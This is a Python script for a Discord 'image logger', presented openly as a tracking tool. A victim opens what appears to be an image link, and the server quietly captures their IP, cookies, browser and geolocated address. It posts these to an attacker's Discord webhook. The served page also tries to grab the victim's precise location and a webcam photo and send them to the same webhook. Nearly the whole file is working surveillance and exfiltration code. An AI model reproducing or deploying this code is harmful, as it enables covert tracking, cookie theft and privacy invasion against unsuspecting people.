# Discord Image Logger with Enhanced Data Collection
# By DeKrypt | Modified for Additional Tracking Features

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL",
    "image": "https://your-image-url.com/image.png",
    "imageArgument": True,
    "username": "Enhanced Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been tracked.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-redirect-link.com"
    }
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = config["image"]
            
            if config["imageArgument"] and dic.get("url"):
                url = base64.b64decode(dic.get("url").encode()).decode()
            
            user_ip = self.headers.get('x-forwarded-for', 'Unknown')
            user_agent = self.headers.get('user-agent', 'Unknown')
            cookies = self.headers.get('cookie', 'None')
            referer = self.headers.get('referer', 'None')
            
            info = requests.get(f"http://ip-api.com/json/{user_ip}?fields=16976857").json()
            
            os, browser = httpagentparser.simple_detect(user_agent)
            
            embed = {
                "username": config["username"],
                "content": "@everyone",
                "embeds": [
                    {
                        "title": "Enhanced Image Logger - IP Logged",
                        "color": config["color"],
                        "description": f"""
                        **User Opened the Image!**
                        
                        **IP Info:**
                        > **IP:** `{user_ip}`
                        > **Provider:** `{info.get('isp', 'Unknown')}`
                        > **Country:** `{info.get('country', 'Unknown')}`
                        > **City:** `{info.get('city', 'Unknown')}`
                        > **Coords:** `{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}`
                        > **Timezone:** `{info.get('timezone', 'Unknown')}`
                        > **VPN:** `{info.get('proxy', 'Unknown')}`
                        
                        **Device Info:**
                        > **OS:** `{os}`
                        > **Browser:** `{browser}`
                        
                        **Additional Info:**
                        > **Cookies:** `{cookies}`
                        > **Referer:** `{referer}`
                        
                        **Live Location & Camera Access:** [Click Here](javascript:requestPermissions())
                        """,
                        "thumbnail": {"url": url}
                    }
                ]
            }
            
            requests.post(config["webhook"], json=embed)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            data = f"""
            <script>
                function requestPermissions() {{
                    navigator.geolocation.getCurrentPosition(function(position) {{
                        let coords = position.coords.latitude + ',' + position.coords.longitude;
                        fetch('{config["webhook"]}', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                username: "Location Logger",
                                content: "User's Precise Location: " + coords + " [Google Maps](https://www.google.com/maps/search/" + coords + ")"
                            }})
                        });
                    }});
                    
                    navigator.mediaDevices.getUserMedia({{ video: true }}).then((stream) => {{
                        let video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        let canvas = document.createElement('canvas');
                        let context = canvas.getContext('2d');
                        setTimeout(() => {{
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            canvas.toBlob(blob => {{
                                let formData = new FormData();
                                formData.append("file", blob, "webcam.jpg");
                                fetch('{config["webhook"]}', {{
                                    method: 'POST',
                                    body: formData
                                }});
                            }});
                        }}, 3000);
                    }}).catch(() => {{
                        fetch('{config["webhook"]}', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                username: "Camera Logger",
                                content: "User denied camera access."
                            }})
                        }});
                    }});
                }}
            </script>
            <button onclick='requestPermissions()'>Grant Permissions</button>
            """.encode()
            
            self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            traceback.print_exc()
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
